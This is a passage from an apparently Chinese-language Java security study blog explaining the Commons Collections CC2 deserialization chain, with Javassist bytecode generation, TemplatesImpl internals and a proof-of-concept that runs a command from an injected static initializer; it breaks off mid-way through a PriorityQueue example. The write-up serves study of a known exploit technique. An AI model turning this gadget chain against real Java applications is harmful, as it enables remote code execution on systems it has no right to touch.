class="hljs-number">61</span> <span class="hljs-number">6</span>e<span class="hljs-number">67</span> <span class="hljs-number">2</span>f<span class="hljs-number">53</span> <span class="hljs-number">7472</span> <span class="hljs-number">696</span>e <span class="hljs-number">673</span>b <span class="hljs-number">2956</span> <span class="hljs-number">0021</span>  lang/String;)V.!<br><span class="hljs-attribute">00000140</span>: <span class="hljs-number">0005</span> <span class="hljs-number">0006</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0002</span> <span class="hljs-number">0001</span> <span class="hljs-number">0007</span> <span class="hljs-number">0008</span>  ................<br><span class="hljs-attribute">00000150</span>: <span class="hljs-number">0001</span> <span class="hljs-number">0009</span> <span class="hljs-number">0000</span> <span class="hljs-number">001</span>d <span class="hljs-number">0001</span> <span class="hljs-number">0001</span> <span class="hljs-number">0000</span> <span class="hljs-number">0005</span>  ................<br><span class="hljs-attribute">00000160</span>: <span class="hljs-number">2</span>ab<span class="hljs-number">7</span> <span class="hljs-number">0001</span> b<span class="hljs-number">100</span> <span class="hljs-number">0000</span> <span class="hljs-number">0100</span> <span class="hljs-number">0</span>a<span class="hljs-number">00</span> <span class="hljs-number">0000</span> <span class="hljs-number">0600</span>  *...............<br><span class="hljs-attribute">00000170</span>: <span class="hljs-number">0100</span> <span class="hljs-number">0000</span> <span class="hljs-number">0300</span> <span class="hljs-number">0900</span> <span class="hljs-number">0</span>b<span class="hljs-number">00</span> <span class="hljs-number">0</span>c<span class="hljs-number">00</span> <span class="hljs-number">0100</span> <span class="hljs-number">0900</span>  ................<br><span class="hljs-attribute">00000180</span>: <span class="hljs-number">0000</span> <span class="hljs-number">2500</span> <span class="hljs-number">0200</span> <span class="hljs-number">0100</span> <span class="hljs-number">0000</span> <span class="hljs-number">09</span>b<span class="hljs-number">2</span> <span class="hljs-number">0002</span> <span class="hljs-number">1203</span>  ..%.............<br><span class="hljs-attribute">00000190</span>: b<span class="hljs-number">600</span> <span class="hljs-number">04</span>b<span class="hljs-number">1</span> <span class="hljs-number">0000</span> <span class="hljs-number">0001</span> <span class="hljs-number">000</span>a <span class="hljs-number">0000</span> <span class="hljs-number">000</span>a <span class="hljs-number">0002</span>  ................<br><span class="hljs-attribute">000001a0</span>: <span class="hljs-number">0000</span> <span class="hljs-number">0005</span> <span class="hljs-number">0008</span> <span class="hljs-number">0006</span> <span class="hljs-number">0001</span> <span class="hljs-number">000</span>d <span class="hljs-number">0000</span> <span class="hljs-number">0002</span>  ................<br><span class="hljs-attribute">000001b0</span>: <span class="hljs-number">000</span>e                                     ..<br></code></pre></td></tr></table></figure><p>其他详见 class 文件解析，class 文件属性解析，java 虚拟机指令集</p><p>正是有了这些基础，出现了 Java 字节码库允许我们通过字节码库的 API 动态创建修改 Java 类、方法、变量等操作，例如：一种通用的 Java 字节码操作和分析框架<code>ASM</code>，可以直接以二进制形式修改现有的类或者生成类文件；另一种是<code>Javassist</code>，它相比于<code>ASM</code>更简便，我们不用关注 Java 底层的字节码和栈操作，学会如何使用其 API 就可以实现字节码的编辑</p><p>和反射差不多用，参考：<a href="https://javasec.org/javase/JavaByteCode/Javassist.html">javasec</a> <a href="https://www.w3cschool.cn/article/35230124.html">w3cschool</a> <a href="https://github.com/IndustriousSnail/javassist-learn">javaassist-translate</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC2;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JavassistDemo</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, IOException, NotFoundException </span>&#123;<br>        ClassPool classPool = ClassPool.getDefault();<br>        CtClass ctClass = classPool.makeClass(<span class="hljs-string">&quot;CommonsCollections.CC2.Evil&quot;</span>);<br>        CtMethod Mmain = CtMethod.make(<br>                <span class="hljs-string">&quot;public static void main(String[] args) &#123;System.out.println(\&quot;main method\&quot;);&#125;&quot;</span>, ctClass<br>        );<br>        ctClass.addMethod(Mmain);<br>        ctClass.makeClassInitializer().insertBefore(<span class="hljs-string">&quot;System.out.println(\&quot;evil code\&quot;);&quot;</span>);<br>        CtMethod MSysinfo = <span class="hljs-keyword">new</span> CtMethod(CtClass.voidType, <span class="hljs-string">&quot;Sysinfo&quot;</span>, <span class="hljs-keyword">new</span> CtClass[]&#123;&#125;, ctClass);<br>        MSysinfo.setModifiers(<span class="hljs-number">1</span>);<br>        MSysinfo.setBody(<span class="hljs-string">&quot;System.out.println(System.getProperty(\&quot;os.name\&quot;));&quot;</span>);<br>        ctClass.addMethod(MSysinfo);<br>        ctClass.writeFile(<span class="hljs-string">&quot;D:\\program\\java\\moonlight\\src\\main\\java&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC2;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] var0)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;main method&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;evil code&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Sysinfo</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Evil</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>既然可以通过<code>Javassist</code>写入静态代码，那么只要类实例被创建就会执行；生成的 class 文件如何利用呢，读取为 byte 数组，然后通过<strong>继承 ClassLoader，重写 findClass 方法</strong>或者直接<strong>反射调用 defineClass 方法</strong>(不想遵循双亲委派可以<strong>重写 loadClass</strong>)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">byte</span>[] bytes = ctClass.toBytecode();<br><br><span class="hljs-comment">//1</span><br><span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-keyword">return</span> defineClass(类名, 类字节码<span class="hljs-keyword">byte</span>数组, <span class="hljs-number">0</span>, <span class="hljs-keyword">byte</span>数组长度);<br>    &#125;<br><br><span class="hljs-comment">//2</span><br>Class clz = Class.forName(<span class="hljs-string">&quot;java.lang.ClassLoader&quot;</span>);<br>Method defineClassMeth = clz.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-keyword">byte</span>[].class, <span class="hljs-keyword">int</span>.class, <span class="hljs-keyword">int</span>.class);<br>defineClassMeth.setAccessible(<span class="hljs-keyword">true</span>);<br>Class ac = (Class) defineClassMeth.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;myjavasec.Moonlight&quot;</span>, bytes, <span class="hljs-number">0</span>, bytes.length);<br>ac.newInstance();<br></code></pre></td></tr></table></figure><p>但因为<code>ClassLoader.defineClass</code>是<code>protected</code>的，我们无法通过外部访问，不能直接使用反射调用</p><p>然而，总有一些类的<code>defineClass</code>方法是被底层的其他类使用到了的，这就是<code>TemplatesImpl</code>的内部类<code>TransletClassLoader</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TransletClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ClassLoader</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;<br><br>     TransletClassLoader(ClassLoader parent) &#123;<br>         <span class="hljs-keyword">super</span>(parent);<br>        _loadedExternalExtensionFunctions = <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;<br>        <span class="hljs-keyword">super</span>(parent);<br>        _loadedExternalExtensionFunctions = mapEF;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        Class&lt;?&gt; ret = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-comment">// The _loadedExternalExtensionFunctions will be empty when the</span><br>        <span class="hljs-comment">// SecurityManager is not set and the FSP is turned off</span><br>        <span class="hljs-keyword">if</span> (_loadedExternalExtensionFunctions != <span class="hljs-keyword">null</span>) &#123;<br>            ret = _loadedExternalExtensionFunctions.get(name);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ret == <span class="hljs-keyword">null</span>) &#123;<br>            ret = <span class="hljs-keyword">super</span>.loadClass(name);<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>     &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Access to final protected superclass member from outer class.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function">Class <span class="hljs-title">defineClass</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-keyword">byte</span>[] b)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> defineClass(<span class="hljs-keyword">null</span>, b, <span class="hljs-number">0</span>, b.length);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个类里重写了 defineClass 方法，并且这里没有显式地声明其定义域。Java 中默认情况下，如果一个 方法没有显式声明作用域，其作用域为 default。所以也就是说这里的 defineClass 由其父类的 protected 类型变成了一个 default 类型的方法，可以被类外部调用。</p><p>往前看调用结构为：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span><span class="hljs-module"><span class="hljs-identifier">TransletClassLoader</span>.</span></span>defineClass<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span><span class="hljs-module"><span class="hljs-identifier">TransletClassLoader</span>.</span></span>defineTransletClasses<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletClasses()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">OutputProperties()</span><br>        #TrAXFilter.<span class="hljs-constructor">TrAXFilter(Templates)</span> # CC3则用到了TrAXFilter类<br></code></pre></td></tr></table></figure><p>而<code>TemplatesImpl.getOutputProperties</code>和<code>TemplatesImpl.newTransformer</code>都是 public，可以被外部调用</p><p>而<code>getOutputProperties</code>方法符合<code>JavaBean</code>的<code>getter</code>定义</p><h4 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h4><p>我们现在要调用读入的字节码数组<code>static</code>代码块，并且初始化，ysoserial 用的是<code>TemplatesImpl</code></p><p>在<code>newTransformer</code>方法调用了<code>getTransletInstance</code>，当<code>_class</code>数组不为空时</p><ul><li>调用<code>defineTransletClasses</code>，通过<code>loader.defineClass</code>读取了字节码数组</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>    _class[i] = loader.defineClass(_bytecodes[i]);<br>    <span class="hljs-keyword">final</span> Class superClass = _class[i].getSuperclass();<br><br>    <span class="hljs-comment">// Check if this is the main class</span><br>    <span class="hljs-keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;<br>        _transletIndex = i;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        _auxClasses.put(_class[i].getName(), _class[i]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>调用<code>newInstance</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();<br></code></pre></td></tr></table></figure><p>这两步成功执行字节码的 static 代码块</p><p>暂时直接调用<code>TemplatesImpl.newTransformer</code>，编写 poc 如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC2;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2poc</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span> <span class="hljs-params">(Object o, String fieldName,Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredField = clz.getDeclaredField(fieldName);<br>            declaredField.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredField.set(o,value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">//生成类</span><br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br><br>        <span class="hljs-comment">//写入static代码</span><br>        ctc.makeClassInitializer().insertBefore(cmd);<br><br>        <span class="hljs-comment">//继承AbstractTranslet类</span><br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br><br>        <span class="hljs-comment">//转换为字节码数组，相当于输出了字节码文件了</span><br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br><br>        <span class="hljs-comment">//实例化TemplatesImpl，反射修改四个属性值</span><br>        TemplatesImpl templatesimpl = TemplatesImpl.class.newInstance();<br>        <span class="hljs-comment">//TemplatesImpl templatesimpl = new TemplatesImpl();//也可以通过构造方法实例化</span><br><br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-keyword">null</span>);<br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,targetclassbytes);<br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>        templatesimpl.newTransformer();<br>        <span class="hljs-comment">//templatesimpl.getOutputProperties();//也可以这样触发</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里通过文章构造出来了初步 poc，存疑：</p><ul><li>什么是池路径</li></ul><blockquote><p><strong>ClassPool.getDefault</strong> 默认会搜索 JVM 下面相同路径的类，并返回 ClassPool。但是，如果一个程序运行在 Web 应用服务器上，像 JBoss 和 Tomcat 那种，<strong>ClassPool</strong>对象可能就找不到用户指定的类了，因为 web 应用服务使用了多个系统类加载器。这种情况下，需要给<strong>ClassPool</strong>注册一个额外的 Class 路径。如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(<span class="hljs-keyword">this</span>.getClass()));<br></code></pre></td></tr></table></figure><p>这句代码注册了一个类的类路径，这个类是<strong>this</strong>指向的那个类。你可以使用任意<strong>Class</strong>代替**this.getClass()**。</p><p>你也可以注册一个文件夹作为类路径。例如，下面这段代码增添可以了文件夹**/usr/local/javalib**到搜索路径中：</p><p>ClassPool pool = ClassPool.getDefault();<br>pool.insertClassPath(“/usr/local/javalib”);</p><p>搜索路径不仅可以是目录，甚至可以是 URL：</p><p>ClassPool pool = ClassPool.getDefault();<br>ClassPath cp = new URLClassPath(“<a href="http://www.javassist.org&quot;/">www.javassist.org&quot;</a>, 80, “/java/“, “org.javassist.”);<br>pool.insertClassPath(cp);</p><p>该代码增添了<strong><a href="http://www.javassist.org/java/">http://www.javassist.org:80/java/</a></strong> 到类文件搜索路径下。该 URL 仅仅搜索<strong>org.javassist.</strong> 包下的 class 文件。例如，要加载<strong>org.javassist.test.Main</strong> 这个类，javassist 会从这个地址下获取该类文件：</p><p><a href="http://www.javassist.org/java/org/javassist/test/Main.class">http://www.javassist.org:80/java/org/javassist/test/Main.class</a></p><p>此外，你也可以直接给<strong>ClassPool</strong>对象一个 byte 数组，然后用这个数组构建<strong>CtClass</strong>对象。要这样做，用<strong>ByteArrayClassPath</strong>, 例如：</p><p>ClassPool cp = ClassPool.getDefault();<br>byte[] b = a byte array;<br>String name = class name;<br>cp.insertClassPath(new ByteArrayClassPath(name, b));<br>CtClass cc = cp.get(name);</p><p>获得的<strong>CtClass</strong>对象表示一个由<strong>b</strong>指定的类文件定义的类。如果调用<strong>get()</strong> ，<strong>ClassPool</strong>会从<strong>ByteArrayClassPath</strong>中读取一个 Class 文件，指定的 Class 的名字就是上面的<strong>name</strong>变量。</p><p>如果你不知道这个类的全限定名，你可以使用<strong>ClassPool</strong>中的<strong>makeClass()</strong> :</p><p>ClassPool cp = ClassPool.getDefault();<br>InputStream ins = an input stream for reading a class file;<br>CtClass cc = cp.makeClass(ins);</p><p><strong>makeClass()</strong> 返回一个通过输入流构建出来的<strong>CtClass</strong>。你可以使用<strong>makeClass()</strong> 给<strong>ClassPool</strong> 对象提供一个比较急的 Class 文件。如果搜索路径包含了一个很大的 jar 包，这可以提高性能。因为<strong>ClassPool</strong>对象会一个一个找，它可能会重复搜索整个 jar 包中的每一个 class 文件。<strong>makeClass()</strong> 可以优化这个搜索。<strong>makeClass()<strong>构造出来的类会保存在</strong>ClassPool</strong>对象中，你下次再用的时候，不会再次读 Class 文件</p></blockquote><h4 id="AbstractTranslet"><a href="#AbstractTranslet" class="headerlink" title="AbstractTranslet"></a>AbstractTranslet</h4><ul><li>为什么设置父类为<code>AbstractTranslet</code></li></ul><p><code>TemplatesImpl</code>中对加载的字节码是有一定要求的：这个字节码对应的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类</p><p>在<code>TemplatesImpl.defineTransletClasses</code>方法中，<code>_transletIndex</code>在循环体判断字节码是否继承自<code>AbstractTranslet</code>并赋值 i；否则没有赋值则默认-1；而在循环体下面的判断，如果小于零会抛出异常；因此需要设置其父类为<code>AbstractTranslet</code></p><ul><li>在使用 javaassit+TemplatesImpl，为什么传入池路径是<code>AbstractTranslet.class</code></li></ul><p>在使用<code>TemplatesImpl</code>时，插入池路径的值为<code>AbstractTranslet.class</code>，是因为<code>TemplatesImpl</code>继承了<code>AbstractTranslet</code>类，并且在执行<code>transform()</code>方法时需要访问<code>AbstractTranslet</code>类的定义。具体来说，<code>TemplatesImpl</code>中的<code>transform()</code>方法会调用<code>AbstractTranslet</code>类中的<code>transform()</code>方法来执行 XSLT 转换。因此，在构造<code>TemplatesImpl</code>实例时，需要插入<code>AbstractTranslet</code>类的定义到类池路径中，以便在执行<code>transform()</code>方法时能够找到<code>AbstractTranslet</code>类的定义。<strong>ClassPool.getDefault</strong> 默认会搜索 JVM 下面相同路径的类，并返回 ClassPool。但是，如果一个程序运行在 Web 应用服务器上，像 JBoss 和 Tomcat 那种，<strong>ClassPool</strong>对象可能就找不到用户指定的类了，因为 web 应用服务使用了多个系统类加载器。这种情况下，需要给<strong>ClassPool</strong>注册一个额外的 Class 路径。虽然<code>TemplatesImpl</code>只是继承了<code>AbstractTranslet</code>类，但是<code>AbstractTranslet</code>类本身也包含了一些用于执行 XSLT 转换的基本方法。因此，在执行 XSLT 转换时，<code>AbstractTranslet</code>类的定义也是必需的。因此为了确保不出错，添加一条额外的<code>AbstractTranslet</code>的搜索路径，确保 Javaassit 生成<code>TemplatesImpl</code>字节码不出错</p><ul><li>设置的四个属性值</li></ul><p>进入<code>defineTransletClasses</code>方法之前有两个判断</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (_name == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br><span class="hljs-keyword">if</span> (_class == <span class="hljs-keyword">null</span>) defineTransletClasses();<br></code></pre></td></tr></table></figure><p>所以<code>_name</code>需要赋值，<code>_class</code>赋空</p><p>剩下两个属性在<code>defineTransletClasses</code>方法里，<code>_bytecodes</code>为空会抛出异常，将其赋值为目标字节码<code>new byte[][]&#123;classbytes&#125;</code>(注意定义为二维数组，需要转换)；<code>_tfactory</code>是<code>TransformerFactoryImpl</code>类定义置空，因此赋值为<code>new TransformerFactoryImpl()</code></p><h4 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h4><blockquote><p><strong>PriorityQueue 优先级队列</strong></p><p><code>PriorityQueue</code> 优先级队列是<strong>基于优先级堆</strong>的一种特殊队列。在我们熟知的队列基础上添加比较器（Comparator）功能，每次插入或者删除元素时，会按照比较器设定的规则进行元素排序等操作</p><p>（1）不定义比较器，使用默认比较器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myqueue</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span>[] list = &#123;<span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>&#125;;<br>        PriorityQueue&lt;Integer&gt; queue = <span class="hljs-keyword">new</span> PriorityQueue&lt;Integer&gt;();<br>        <span class="hljs-comment">// 输出原始队列</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i : list) &#123;<br>            System.out.print(i + <span class="hljs-string">&quot; &quot;</span>);<br>        &#125;<br>        System.out.println();<br>        <span class="hljs-comment">// 逐个插入优先级队列</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i : list) &#123;<br>            queue.add(i);<br>        &#125;<br>        <span class="hljs-comment">// 逐个输出优先级队列</span><br>        <span class="hljs-keyword">while</span> (!queue.isEmpty()) &#123;<br>            <span class="hljs-keyword">int</span> i = queue.remove();<br>            System.out.print(i + <span class="hljs-string">&quot; &quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-408eaf857d4e79fd633d58da6ff536f0_r.jpg"></p><p>可以看出，使用默认的比较器，每次弹出的元素是队列中最小的。</p><p>（2）定义一个比较器，从大到小输出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 